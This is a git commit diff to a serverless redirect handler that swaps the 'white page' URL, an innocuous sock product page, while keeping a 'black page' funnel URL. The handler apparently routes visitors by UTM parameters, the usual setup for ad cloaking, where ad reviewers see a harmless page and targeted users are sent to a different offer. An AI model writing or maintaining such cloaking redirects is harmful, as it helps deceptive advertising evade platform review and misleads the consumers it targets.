03f3a7d9e593ebfb9d8db36958562b7210f37ea7
Hassan86639 <hassan86639@gmail.com>
2025-10-13 02:59:50 +0500

    Update redirect.js

--- api/redirect.js
+++ api/redirect.js
@@ -1,6 +1,6 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://www.wordans.co.uk/work-force-wfsbm-ultimate-heavy-duty-workwear-socks-for-men-517983";
+    const whitePageURL = "https://www.arket.com/en-eu/product/supima-cotton-rib-socks-set-of-3-pairs-bluerust-1260223012/";
     const blackPageURL = "https://gymboreeusk.myfunnelish.com/Stimulus";
   
     // Parse the UTM parameters from the request URL
@@ -25,6 +25,7 @@ export default function handler(req, res) {
   
     res.end();
   }
+
 
 
 
